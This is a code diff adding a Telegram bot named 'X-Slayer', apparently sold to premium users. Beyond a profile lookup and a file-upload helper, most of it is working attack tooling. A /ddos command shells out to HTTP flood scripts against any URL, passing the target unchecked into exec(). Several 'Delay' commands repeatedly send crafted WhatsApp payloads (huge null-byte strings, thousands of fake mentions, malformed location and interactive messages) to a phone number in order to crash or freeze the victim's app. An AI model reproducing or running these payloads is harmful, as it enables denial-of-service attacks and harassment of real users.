+        isVideo = true;
+      } else if (photos.length > 0) {
+        sendMedia = photos[0];
+      }
+    }
+
+    const mediaInfo = mediaLinks.length
+      ? `\n\nProfile:\n${mediaLinks.join("\n")}`
+      : "";
+const caption = `
+<blockquote><b>TELEGRAM STALK</b></blockquote>
+
+<b>ID:</b> ${escapeHTML(res.id)}
+<b>Username:</b> @${escapeHTML(res.username || "-")}
+<b>Name:</b> ${escapeHTML(res.name)}
+<b>Bio:</b> ${escapeHTML(res.bio || "-")}
+<b>Verified:</b> ${res.verified}
+<b>Scam:</b> ${res.scam}
+<b>Fake:</b> ${res.fake}
+<b>Restricted:</b> ${res.restricted}
+
+${mediaLinks.length ? "\n<b>Profile:</b>\n" + mediaLinks.join("\n") : ""}
+`;
+
+    const keyboard = {
+      inline_keyboard: [
+        [
+          {
+            text: "📋 Copy User ID",
+            copy_text: { text: String(res.id) }
+          }
+        ]
+      ]
+    };
+
+    if (sendMedia) {
+      if (isVideo) {
+        await ctx.replyWithVideo(sendMedia, {
+          caption,
+          parse_mode: "HTML",
+          reply_markup: keyboard
+        });
+      } else {
+        await ctx.replyWithPhoto(sendMedia, {
+          caption,
+          parse_mode: "HTML",
+          reply_markup: keyboard
+        });
+      }
+    } else {
+      await ctx.reply(caption, {
+        parse_mode: "HTML",
+        reply_markup: keyboard
+      });
+    }
+  } catch (err) {
+    console.log(err);
+    ctx.reply("Terjadi kesalahan!");
+  }
+});
+
+bot.command("convert", checkPremium, async (ctx) => {
+  const r = ctx.message.reply_to_message;
+  if (!r) return ctx.reply("🪧 ☇ Format: /convert ( reply dengan foto/video )");
+
+  let fileId = null;
+  if (r.photo && r.photo.length) {
+    fileId = r.photo[r.photo.length - 1].file_id;
+  } else if (r.video) {
+    fileId = r.video.file_id;
+  } else if (r.video_note) {
+    fileId = r.video_note.file_id;
+  } else {
+    return ctx.reply("❌ ☇ Hanya mendukung foto atau video");
+  }
+
+  const wait = await ctx.reply("⏳ ☇ Mengambil file & mengunggah ke catbox");
+
+  try {
+    const tgLink = String(await ctx.telegram.getFileLink(fileId));
+
+    const params = new URLSearchParams();
+    params.append("reqtype", "urlupload");
+    params.append("url", tgLink);
+
+    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
+      headers: { "content-type": "application/x-www-form-urlencoded" },
+      timeout: 30000
+    });
+
+    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
+      await ctx.reply(data.trim());
+    } else {
+      await ctx.reply("❌ ☇ Gagal upload ke catbox" + String(data).slice(0, 200));
+    }
+  } catch (e) {
+    const msg = e?.response?.status
+      ? `❌ ☇ Error ${e.response.status} saat unggah ke catbox`
+      : "❌ ☇ Gagal unggah coba lagi.";
+    await ctx.reply(msg);
+  } finally {
+    try { await ctx.deleteMessage(wait.message_id); } catch {}
+  }
+});
+function loadBotnetData() {
+    try {
+        return JSON.parse(fs.readFileSync('./ddos/botnet.json', 'utf8'));
+    } catch (error) {
+        console.error('Error loading botnet data:', error.message);
+        return { endpoints: [] };
+    }
+}
+
+// Fungsi untuk menyimpan data botnet ke file JSON
+function saveBotnetData(botnetData) {
+    try {
+        fs.writeFileSync('./ddos/botnet.json', JSON.stringify(botnetData, null, 2));
+    } catch (error) {
+        console.error('Error saving botnet data:', error.message);
+    }
+}
+
+//------------------ TOOLS DDOS -------------//
+bot.command('ddos', checkPremium, async (ctx) => {
+  const chatId = ctx.chat.id;
+  const fromId = ctx.from.id;
+
+  const input = ctx.message.text.substring(6).trim().split(/\s+/); 
+
+  const target = input[0];
+  const time = input[1];
+  const methods = input[2];
+
+  if (!target || !time || !methods) {
+    return ctx.reply(
+      "Contoh Penggunaan:\n/ddos https://example.com 60 pidoras",
+      { parse_mode: "HTML" }
+    );
+  }
+await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
+    caption: `
+<blockquote>( 👑 ) -# 𝖷 - 𝖲 𝖫 𝖠 𝖸 𝖤 𝖱</blockquote>
+𖤓 Target: ${target}
+𖤓 Time: ${time}
+𖤓 Metode: ${methods}`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "Check Target", url: `https://check-host.net/check-http?host=${target}` }
+      ]]
+    }
+  });
+
+  if (methods === "strike") {
+    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
+  } else if (methods === "mix") {
+    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
+    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
+    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
+  } else if (methods === "flood") {
+    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
+  } else if (methods === "h2vip") {
+    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
+    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
+  } else if (methods === "h2") {
+    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
+  } else if (methods === "pidoras") {
+    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
+  } else {
+    ctx.reply("❌ Metode tidak dikenali atau format salah.");
+  }
+});
+//-------------- COMMAND BUG --------------//
+bot.command("DelayEasy", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+
+  
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /DelayEasy 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = true;
+
+  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
+    caption: `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Delay Easy
+𖤓 Status: Process
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+  for (let i = 0; i < 120; i++) {
+    await AyunBelovedxnxx(sock, target);
+    await Kalzdelay(target);
+    await FaiqDelayInvis2(target, false);
+    await Jtwdlyinvis(target);
+    await Kurangg(sock, target);
+    await new Promise((r) => setTimeout(r, 500));
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Delay Easy
+𖤓 Status: Success
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+//BOT CMD FORCE 10 MSG//
+bot.command("DelayMedium", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+
+  
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /DelayMedium 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = true;
+
+  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
+    caption: `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Delay Medium
+𖤓 Status: Process
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+  for (let i = 0; i < 120; i++) {
+    await AyunBelovedxnxx(sock, target);
+    await Kalzdelay(target);
+    await FaiqDelayInvis2(target, false);
+    await delayinvisible(target);
+    await new Promise((r) => setTimeout(r, 3000));
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Delay Medium
+𖤓 Status: Success
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+//BOT CMD COMBO FUNCTION
+bot.command("Delayhard", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+
+  
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /Delayhard 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = true;
+
+  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
+    caption: `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Delay Hard
+𖤓 Status: Process
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+  for (let i = 0; i < 130; i++) {
+    await CStatus(sock, target);
+    await EpcihDingkey(sock, target);
+    await delayinvisible(target);
+    await FaiqDelayInvis2(target, false);
+    await EpcihDingkey(sock, target);
+    await newsw(target);
+    await Jtwdlyinvis(target);
+    await DelayBjir(target);
+    await new Promise((r) => setTimeout(r, 3000));
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Delay Hard
+𖤓 Status: Success
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+//BOT CMD FORCE 3 MSG//
+bot.command("DelaySpam", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+
+  
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /DelaySpam 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = true;
+
+  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
+    caption: `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Delay Spam
+𖤓 Status: Process
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+  for (let i = 0; i < 150; i++) {
+    await delayinvisible(target);
+    await delayinvisible(target);
+    await new Promise((r) => setTimeout(r, 3000));
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Delay Spam
+𖤓 Status: Success
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+//BOT CMD DELAY VERY HARD//
+bot.command("DelayXBuldo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+
+  
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /DelayXBuldo 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = true;
+
+  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
+    caption: `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Delay Spong Kuota  
+𖤓 Status: Process
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+  for (let i = 0; i < 120; i++) {
+    await CStatus(sock, target);
+    await DelayHardBulldo(sock, target);
+    await DelayHardBulldo(sock, target);
+    await Kalzdelay(target);
+    await FaiqDelayInvis2(target, false);
+    await new Promise((r) => setTimeout(r, 1000));
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Delay Spong Kuota
+𖤓 Status: Success
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+//BOT CMD SPAM DELAY HARD//
+bot.command("DelaySpam2", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+
+  
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /DelaySpam2 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = true;
+
+  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
+    caption: `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Delay Spamming
+𖤓 Status: Process
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+  for (let i = 0; i < 110; i++) {
+    await CStatus(sock, target);
+    await Kurangg(sock, target);
+    await DelayBjir(target);
+    await Jtwdlyinvis(target);
+    await newsw(target);
+    await Kalzdelay(target);
+    await new Promise((r) => setTimeout(r, 3500));
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Delay Spamming
+𖤓 Status: Success
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+bot.command("DelayOnlySpam", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
+
+  
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Format: /DelayOnlySpam 62×××`);
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+  let mention = true;
+
+  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
+    caption: `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Bebas Spam
+𖤓 Status: Process
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`,
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+
+  const processMessageId = processMessage.message_id;
+
+  for (let i = 0; i < 110; i++) {
+    await Jtwdlyinvis(target);
+    await Jtwdlyinvis(target);
+    await Jtwdlyinvis(target);
+    await Jtwdlyinvis(target);
+    await DelayBjir(target);
+    await FaiqDelayInvis2(target, false);
+    await new Promise((r) => setTimeout(r, 3500));
+  }
+
+  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
+<blockquote><b>𖤓〘 𝐗-𝐒𝐥𝐚𝐲𝐞𝐫 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
+𖤓 Target:  ${q}
+𖤓 Type: Bebas Spam
+𖤓 Status: Success
+<blockquote><b>𖤓〘 𝐗-𝐒𝐋𝐀𝐘𝐄𝐑 〙𖤓</b></blockquote>`, {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [[
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+      ]]
+    }
+  });
+});
+//------------- FUNCTION BUG -------------//
+
+async function CStatus(sock, target) {
+    let msg =
+ generateWAMessageFromContent(target, {
+        interactiveResponseMessage: {
+            body: {
+                text: "\u0000".repeat(9000),
+                format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+                name: "address_message",
+                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"H\",\"address\":\"XT\",\"tower_number\":\"X\",\"city\":\"Medan\",\"name\":\"X\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
+                version: 3
+            },
+            contextInfo: {
+                mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
+                isForwarded: true,
+                forwardingScore: 7205,
+                forwardedNewsletterMessageInfo: {
+                    newsletterJid: "120363395010254840@newsletter",
+                    newsletterName: "유Ŧɍɇvøsɨᵾm-Ǥħøsŧ유",
+                    serverMessageId: 1000,
+                    accessibilityText: "idk"
+                },
+                statusAttributionType: "RESHARED_FROM_MENTION",
+                contactVcard: true,
+                isSampled: true,
+                dissapearingMode: {
+                    initiator: target,
+                    initiatedByMe: true
+                },
+                expiration: Date.now()
+            },
+        }
+    }, {});
+
+    await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
+        participant: { jid: target }
+    });
+    const msg1 = {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: "X",
+                        format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "address_message",
+                        paramsJson: "\x10".repeat(1045000),
+                        version: 3
+                    },
+                    entryPointConversionSource: "call_permission_request"
+                }
+            }
+        }
+    };
+
+    const msg2 = {
+        ephemeralExpiration: 0,
+        forwardingScore: 9741,
+        isForwarded: true,
+        font: Math.floor(Math.random() * 99999999),
+        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
+    };
+
+    for (let i = 0; i < 1000; i++) {
+        const payload = generateWAMessageFromContent(target, msg1, msg2);
+
+        await sock.relayMessage(target, {
+            groupStatusMessageV2: {
+                message: payload.message
+            }
+        }, { messageId: payload.key.id, participant: { jid: target } });
+
+        await sleep(1000);
+    }
+
+    await sock.relayMessage("status@broadcast", {
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [{ tag: "to", attrs: { jid: target } }]
+            }]
+        }]
+    });
+}
+async function KhasJawaFreeze(sock, target) {
+  await sock.relayMessage(target, {
+    "videoMessage": {
+      "url": "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
+      "mimetype": "video/mp4",
+      "fileSha256": "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
+      "fileLength": "175891",
+      "seconds": 1,
+      "mediaKey": "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
+      "height": 848,
+      "width": 480,
+      "fileEncSha256": "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
+      "directPath": "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
+      "mediaKeyTimestamp": "1765345955",
+      "streamingSidecar": "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
+      "annotations": [{
+        "shouldSkipConfirmation": true,
+        "embeddedContent": {
+          "embeddedMusic": {
+            "musicContentMediaId": "3312808138872179",
+            "songId": "270259430421407",
+            "author": "ြ".repeat(200000),
+
+            "title": " # 🚯 KhasJawa Freeze ",
+            "artworkDirectPath": "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
+            "artworkSha256": "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
+            "artworkEncSha256": "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
+            "artistAttribution": "https://www.instagram.com/_u/carlos_10474",
+            "countryBlocklist": "",
+            "isExplicit": true,
+            "artworkMediaKey": "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
+            "musicSongStartTimeInMs": "10149",
+            "derivedContentStartTimeInMs": "0",
+            "overlapDurationInMs": "1000"
+          }
+        },
+        "embeddedAction": true
+      }]
+    }
+  }, {
+    ephemeralExpiration: 0,
+    forwardingScore: 9741,
+    isForwarded: true,
+    font: Math.floor(Math.random() * 99999999),
+    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
+  });
+}
+async function Kurangg(sock, target) {
+  let msg = {
+    requestPaymentMessage: {
+      currencyCodeIso4217: "USD",
+      requestFrom: target,
+      expiryTimestamp: null,
+      contextInfo: {
+        remoteJid: "O",
+        isForwarded: true,
+        forwardingScore: 9999,
+        externalAdReply: {
+          title: "\0",
+          body: "\0",
+          mediaType: "VIDEO",
+          renderLargerThumbnail: true,
+          previewType: "VIDEO",
+          sourceUrl: "https://pedulilindungi",
+          mediaUrl: "https://kominfo",
+          showAdAttribution: true
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage(target, msg, {
+    messageId: null,
+    participant: { jid: target }
+  });
+}
+
+async function fizsztry(sock, target) {
+  try {
+    const TheFizs = {
+      viewOnceMessage: {
+        message: {
+          locationMessage: {
+            degreesLatitude: 91,
+            degreesLongitude: 181,
+            name: "𓆩🧠𓆪".repeat(50000),
+            address: "ꦾ".repeat(50000),
+            url: "https://t.me/ythfiz".repeat(1000),
+            isLive: true,
+            accuracyInMeters: 999999,
+            speedInMps: 999,
+            degreesClockwiseFromMagneticNorth: 999,
+            comment: "ោ៝".repeat(50000),
+            jpegThumbnail: Buffer.alloc(50000, 0xFF).toString('base64'),
+            contextInfo: {
+              mentionedJid: Array.from({length: 100}, () => target),
+              forwardingScore: 999999,
+              isForwarded: true,
+              quotedMessage: {
+                locationMessage: {
+                  degreesLatitude: 1010101,
+                  degreesLongitude: 1010101
+                }
+              }
+            }
+          }
+        }
+      }
+    };
+    
+    await sock.relayMessage(target, Thefizs, {
+      participant: { jid: target },
+      messageId: `CRASH_CLICK_${Date.now()}`
+    });
+
+    console.log(`✅ Crash click sent to ${target}`);
+    
+  } catch(e) {
+    console.log(`❌ Failed:`, e.message);
+  }
+}
+async function DelayBjir(target) {
+  try {
+    const AimBot = {
+      viewOnceMessage: {
+        message: {
+          locationMessage: {
+            degreesLatitude: 9.999999,
+            degreesLongitude: -9.999999,
+            name: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯" + "\u0000".repeat(88888),
+            address: "\u0000".repeat(5555),
+            contextInfo: {
+              mentionedJid: Array.from({ length: 2000 }, () =>
+                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
+              ),
+              isSampled: true,
+              participant: target,
+              remoteJid: target,
+              forwardingScore: 9741,
+              isForwarded: true
+            }
+          }
+        }
+      }
+    };
+
+    const AimBot2 = {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "call_permission_request",
+              paramsJson: "\u0000".repeat(1045000),
+              version: 3
+            }
+          }
+        }
+      }
+    };
+
+    const AimBot3 = {
+      extendedTextMessage: {
+        text:
+          "⎋🦠</🧬⃟༑⌁⃰𝙕𝙚𝙧𝙤𝙂𝙝𝙤𝙨𝙩𝙓ཀ‌‌\\>🍷𞋯" +
+          "\u0000".repeat(299986),
+        contextInfo: {
+          participant: target,
+          mentionedJid: [
+            "0@s.whatsapp.net",
+            ...Array.from(
+              { length: 1900 },
+              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+            )
+          ]
+        }
+      }
+    };
+
+    const msg1 = generateWAMessageFromContent(target, AimBot, {});
+    await sock.relayMessage("status@broadcast", msg1.message, {
+      messageId: msg1.key.id,
+      statusJidList: [target],
+      additionalNodes: [
+        {
+          tag: "meta",
+          attrs: {},
+          content: [
+            {
+              tag: "mentioned_users",
+              attrs: {},
+              content: [
+                { tag: "to", attrs: { jid: target }, content: undefined }
+              ]
+            }
+          ]
+        }
+      ]
+    });
+
+    const msg2 = generateWAMessageFromContent(target, AimBot2, {});
+    await sock.relayMessage("status@broadcast", msg2.message, {
+      messageId: msg2.key.id,
+      statusJidList: [target],
+      additionalNodes: [
+        {
+          tag: "meta",
+          attrs: {},
+          content: [
+            {
+              tag: "mentioned_users",
+              attrs: {},
+              content: [
+                { tag: "to", attrs: { jid: target }, content: undefined }
+              ]
+            }
+          ]
+        }
+      ]
+    });
+
+    const msg3 = generateWAMessageFromContent(target, AimBot3, {});
+    await sock.relayMessage("status@broadcast", msg3.message, {
+      messageId: msg3.key.id,
+      statusJidList: [target],
+      additionalNodes: [
+        {
+          tag: "meta",
+          attrs: {},
+          content: [
+            {
+              tag: "mentioned_users",
+              attrs: {},
+              content: [
+                { tag: "to", attrs: { jid: target }, content: undefined }
+              ]
+            }
+          ]
+        }
+      ]
+    });
+  } catch (err) {
+    console.error("BJIR ERROR COK😡🗿:", err);
+  }
+}
+async function Jtwdlyinvis(target) {
+    let permissionX = await generateWAMessageFromContent(
+        target,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "ATTACK X-SLAYER 🤪",
+                            format: "DEFAULT",
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "call_permission_request",
+                            paramsJson: "\x10".repeat(1045000),
+                            version: 3,
+                        },
+                        entryPointConversionSource: "call_permission_message",
+                    },
+                },
+            },
+        },
+        {
+            ephemeralExpiration: 0,
+            forwardingScore: 9741,
+            isForwarded: true,
+            font: Math.floor(Math.random() * 99999999),
+            background:
+                "#" +
